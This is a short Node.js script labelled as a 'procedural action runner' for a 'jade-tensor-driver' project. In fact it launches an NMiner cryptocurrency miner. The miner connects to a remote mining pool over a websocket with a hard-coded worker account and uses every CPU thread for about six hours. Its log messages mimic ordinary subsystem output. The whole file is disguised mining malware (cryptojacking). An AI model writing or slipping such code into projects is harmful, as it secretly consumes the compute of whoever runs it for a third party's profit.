// Procedural action runner for jade-tensor-driver
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./app/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const traceId = "90655e";
    console.log(`[host] Subsystem dispatched for jade-tensor-driver [${traceId}]`);

    const engine = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.saloon",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const tick = () => { setTimeout(tick, 86000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
        process.exit(0);
    }, 351 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${traceId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
